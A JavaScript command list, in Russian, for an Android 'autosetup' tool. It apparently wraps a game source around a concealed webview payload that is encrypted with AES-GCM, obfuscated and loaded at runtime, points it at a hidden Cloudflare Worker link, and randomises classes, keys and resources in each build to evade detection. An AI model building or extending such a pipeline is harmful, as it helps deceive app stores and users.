/**
 * Единый список команд autosetup.
 * Источник описаний для `npm run cmds` (scripts/autosetup/listCommands.js).
 */
module.exports = [
  {
    group: "справка",
    npm: "cmds",
    description: "Показать весь список команд в терминале",
  },
  {
    group: "полный сетап",
    npm: "autosetup",
    description:
      "Jira + meta.json → appName/applicationId, keystore/google-services, game source, webview payload, LINK_HEX, CF-protocol, ротация Blowfish, pad-методы, обфускация, clean, checklist",
  },
  {
    group: "полный сетап",
    npm: "autosetup:checklist",
    description: "Показать итоговый summary (без изменений)",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:jira",
    description:
      "Jira: summary → appName, Package name → applicationId, вложения в temp (keystore/google-services/source)",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:meta",
    description: "meta.json → app/build.gradle + res/values/strings.xml",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:link",
    description: "LINK_HEX ← Cloudflare Worker URL: [CfWorkerDomain] из Jira (https://<workerDomain>/), иначе meta.cloudflareUrl",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:assets",
    description:
      "Jira-вложения или meta.keystore / google-services / подпись → app/ + gradle.properties",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:game",
    description:
      "*_source.zip (Kotlin/Compose) → app/src/main/java (package → namespace), res, ui/GameHost.kt",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:icons",
    description: "icon PNG из Jira → res/mipmap-* (launcher/round/foreground) + playstore-icon.png",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:privacy",
    description: "Privacy URL из Jira → cloudflare-worker/index.js (маркеры + роут /policy)",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:webview",
    description:
      "Payload: javac → StringFog + R8 (per-project seed, dummy-классы, случайный asset) → AES-GCM + mapping; пин/entry/asset в DexOpener",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:cf-protocol",
    description: "Рандомизация CfFields.kt + CF_PROTOCOL воркера (meta.cfProtocol)",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:rotate",
    description: "Новый Blowfish ключ/IV для Blowfish.kt + воркера + LINK_HEX",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:pad-methods",
    description: "Блоки приватных методов (/* autopad-* */) в .kt/.java",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:obfuscation",
    description: "R8 + StringFog по meta.obfuscation",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:randomize",
    description:
      "Новый словарь R8 + -repackageclasses и новые имена ресурсов (drawable/mipmap/xml/raw/font) с правкой ссылок",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:description",
    description: "Описание игры (по строкам/экранам проекта) комментарием в задачу Jira",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:fb-jira",
    description: "Facebook Key Hash (release keystore) + FB Class Name (<namespace>.MainActivity) в поля Jira",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:clean",
    description: "Удалить build / app/build / .kotlin",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:github-aab",
    description:
      "Workflow .github/workflows/android-aab.yml + GitHub Secrets (KEYSTORE_BASE64 / пароли / google-services) через gh",
  },
  {
    group: "частичные шаги",
    npm: "autosetup:git",
    description:
      "Github Token + Git URL из Jira → .git из GitHub (origin без токена); --push-git → первый commit + push",
  },
];
